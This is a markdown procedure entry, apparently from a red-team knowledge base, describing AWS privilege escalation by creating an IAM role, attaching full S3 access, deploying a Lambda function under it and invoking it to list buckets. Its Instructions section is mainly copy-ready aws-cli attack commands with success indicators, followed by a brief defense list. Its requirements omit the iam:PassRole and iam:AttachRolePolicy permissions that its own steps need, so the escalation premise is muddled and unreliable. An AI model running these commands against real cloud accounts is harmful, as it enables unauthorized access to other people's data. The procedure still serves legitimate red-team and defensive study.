---
id: f0e0ab35-ec25-410e-9e69-605e356e76ec
name: aws-lambda-role-privilege-escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:11.985140+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Execution through API|T1106 - Execution through API]]'
  - '[[techniques/Cloud Account Compromise|T1078.004 - Cloud Accounts]]'
sub_techniques: []
tags:
  - '[[tags/Cloud - AWS]]'
  - '[[tags/AWS Lambda]]'
  - '[[tags/Privilege Escalation]]'
commands:
  - '[[commands/aws-iam-create-role]]'
  - '[[commands/aws-lambda-create-function]]'
  - '[[commands/aws-lambda-invoke-function]]'
platforms:
  - AWS
tools:
  - '[[tools/aws-cli]]'
validated: true
---

# aws-lambda-role-privilege-escalation

## Summary

This procedure demonstrates privilege escalation in an AWS environment by creating an IAM role with elevated permissions, attaching it to a new Lambda function, and invoking the function to execute code under the higher-privileged role. It exploits misconfigurations where low-privileged users can create Lambda functions and attach arbitrary IAM roles, allowing attackers to gain access to sensitive resources like S3 buckets or EC2 instances.

## Description

AWS Lambda enables serverless execution, but if an attacker has permissions to create functions and IAM roles, they can escalate privileges by defining a role with broad permissions (e.g., full S3 access) and executing Lambda code that leverages those permissions. This technique assumes the attacker starts with limited credentials but can create resources. The Lambda function runs in a trusted execution environment, assuming the attached role's identity. Successful escalation allows listing or accessing resources beyond the original credentials' scope, such as enumerating S3 buckets. This is common in environments with overly permissive IAM policies for Lambda creation.

## Requirements

1. Valid AWS credentials with permissions to create IAM roles and Lambda functions (e.g., iam:CreateRole, lambda:CreateFunction).
2. AWS CLI installed and configured with the low-privileged credentials.
3. Access to a zip file containing Lambda handler code (e.g., Python script).
4. Target AWS region where resources can be created.

## Defense

- Implement least privilege: Restrict iam:CreateRole and lambda:CreateFunction to trusted principals only.
- Monitor CloudTrail for unusual IAM role creations and Lambda invocations.
- Use IAM conditions to limit role attachments to specific services.
- Enable AWS Config rules to detect over-privileged Lambda roles.

## Objectives

1. Create an IAM role with elevated permissions to access sensitive resources.
2. Deploy a Lambda function attached to the new role.
3. Invoke the function to execute privileged actions, demonstrating escalation.
4. Verify access to resources not available to original credentials.

## Instructions

### Step 1: Create IAM Role with Elevated Permissions

**Context**: First, create a new IAM role that the Lambda function will assume, attaching a policy granting access to sensitive resources like S3. This role will have permissions beyond the attacker's current credentials.

**Command** ([[commands/aws-iam-create-role]]):
```bash
aws iam create-role --role-name lambda-escalation-role --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}] }'
```

> This command creates the role. Expected output includes the role ARN. Then attach a policy:
```bash
aws iam attach-role-policy --role-name lambda-escalation-role --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess
```
> Success: Policy attached, allowing full S3 access when assumed.

### Step 2: Prepare and Create Lambda Function

**Context**: Zip the Lambda handler code and create the function, specifying the elevated IAM role. The code will list S3 buckets to demonstrate escalation.

**Command** ([[commands/aws-lambda-create-function]]):
```bash
aws lambda create-function --function-name escalation-function --runtime python3.7 --zip-file fileb://function.zip --handler lambda_function.lambda_handler --role arn:aws:iam::ACCOUNT_ID:role/lambda-escalation-role --region us-east-1
```

> Replace ACCOUNT_ID with your AWS account ID, and ensure function.zip contains the code from [[codes/python-lambda-list-s3-buckets]]. Expected output: Function configuration details, including ARN. This deploys the function under the privileged role.

### Step 3: Invoke Lambda Function to Escalate

**Context**: Invoke the function to execute the code, which runs with the attached role's permissions, allowing access to S3 resources.

**Command** ([[commands/aws-lambda-invoke-function]]):
```bash
aws lambda invoke --function-name escalation-function --payload '{}' output.json
```

> Expected output: File output.json with S3 bucket list (e.g., {"buckets": [{"Name": "sensitive-bucket"}]}). If escalation succeeds, buckets not visible to original creds appear here.

**Success Indicators**:
- Role creation returns valid ARN.
- Function creation succeeds without permission errors.
- Invocation returns privileged data (e.g., S3 buckets).
